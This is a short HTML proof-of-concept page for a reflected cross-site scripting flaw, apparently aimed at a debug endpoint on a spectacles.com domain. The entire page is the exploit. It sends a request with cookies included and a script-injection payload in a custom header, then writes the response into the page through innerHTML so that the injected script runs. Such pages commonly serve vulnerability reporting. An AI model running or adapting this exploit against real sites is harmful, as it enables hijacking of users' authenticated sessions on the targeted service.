<!DOCTYPE html>
<html>
  <body>
    <h3>PoC Reflected XSS</h3>
    <script>
      fetch('https://www.spectacles.com/debug', {
        method: 'GET',
        headers: {
          'X-My-Test': '">><script>alert(1)</script>',
          'User-Agent': 'PoC-ua'
        },
        credentials: 'include'
      })
      .then(response => response.text())
      .then(html => {
        const div = document.createElement('div');
        div.innerHTML = html;
        document.body.appendChild(div);
      });
    </script>
  </body>
</html>
